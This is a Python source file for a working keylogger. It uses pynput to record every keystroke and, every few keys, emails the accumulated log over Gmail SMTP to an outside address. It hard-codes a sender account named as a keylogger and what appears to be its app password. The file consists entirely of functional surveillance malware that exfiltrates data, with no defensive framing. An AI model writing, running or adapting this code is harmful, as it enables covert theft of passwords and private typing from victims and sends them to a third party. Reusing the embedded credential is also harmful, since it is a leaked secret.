import smtplib
import ssl
from pynput.keyboard import Key, Listener


keys = []
count = 0

def sendEmail(message):
    smtp_server = "smtp.gmail.com"
    port = 587
    sender_email = "keylogger6886@gmail.com"
    password = "gsah rdkq bffh kxft"
    receiver_email = "mail.temp6886@gmail.com"

    context = ssl.create_default_context()

    try:
        server = smtplib.SMTP(smtp_server, port)
        server.ehlo()
        server.starttls(context=context)
        server.ehlo()
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, message)

    except Exception as e:
        print(e)

    finally:
        server.quit()

def on_press(key):
    if key == Key.space:
        print(" ", end=' ')
    elif hasattr(key, 'char'):
        print(key.char, end=' ')
    else:
        print(f'[{key}]', end=' ')

    global keys, count 
    keys.append(str(key))
    count += 1
    if count > 10:
        count = 0
        message = " ".join(str(k) for k in keys)
        print(message)
        sendEmail(message)

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
